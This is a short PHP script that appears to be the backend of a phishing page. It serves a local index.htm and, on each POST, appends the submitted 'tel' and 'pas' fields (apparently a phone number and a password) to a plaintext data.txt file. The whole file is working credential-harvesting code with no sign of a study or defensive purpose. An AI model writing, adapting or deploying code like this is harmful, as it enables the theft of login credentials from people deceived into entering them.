<?php  
    readfile("./index.htm");
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $_POST = json_decode(file_get_contents('php://input'), true);
        $fp = fopen('./data.txt', 'a+');//opens file in append mode  
        fwrite($fp, $_POST['tel'] . PHP_EOL);  
        fwrite($fp, $_POST['pas'] . PHP_EOL);  
        fclose($fp);  
    }
?>  